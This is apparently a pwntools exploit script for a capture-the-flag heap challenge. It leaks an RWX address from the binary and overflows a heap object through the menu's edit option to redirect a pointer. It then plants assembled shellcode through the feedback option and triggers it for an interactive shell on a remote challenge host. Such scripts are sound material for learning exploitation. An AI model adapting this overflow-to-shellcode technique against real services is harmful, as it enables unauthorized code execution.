#!/usr/bin/env python3
from pwn import *
from subprocess import run

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.145.226.92', 7272

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# edit's memcpy
# breakrva 0x314a
# breakrva 0x321c

# CAT's hearsound
breakrva 0x2e83
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
MONKE = 1
CAT = 2

def add(type, name, sound, weight, enum):
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', str(type).encode())
    io.sendlineafter(b':', name)
    io.sendlineafter(b':', sound)
    io.sendlineafter(b':', str(weight).encode())
    io.sendlineafter(b':', str(enum).encode())

def show():
    io.sendlineafter(b'>>', b'2')

def hear(type, idx):
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b'>>', str(type).encode())
    io.sendlineafter(b'>>', str(idx).encode())

def edit(type, idx, name):
    io.sendlineafter(b'>>', b'4')
    io.sendlineafter(b'>>', str(type).encode())
    io.sendlineafter(b'>>', str(idx).encode())
    io.sendlineafter(b'>>', name)

def feedback(feedback):
    io.sendlineafter(b'>>', b'5')
    io.sendlineafter(b'>>', feedback)

def exploit():
    global io
    
    run("nasm -f bin shellcode.asm -o shellcode.bin", shell=True, check=True)
    shellcode = open("shellcode.bin", "rb").read()
    
    io = initialize()

    io.recvuntil(b'at: 0x')
    rwx = int(io.recvline().strip(), 16)

    add(CAT, b'aaaa', b'bbbb', 77, 77)
    add(CAT, b'cccc', b'dddd', 77, 77)

    payload = b'a' * 0x18 + p64(0x71) + p64(rwx)
    edit(CAT, 0, payload)

    payload = p64(0x0) + p64(rwx+0x10) + shellcode
    feedback(payload)
    hear(CAT, 1)

    log.success("rwx: %#x", rwx)
    io.interactive()
    
if __name__ == '__main__':
    exploit()

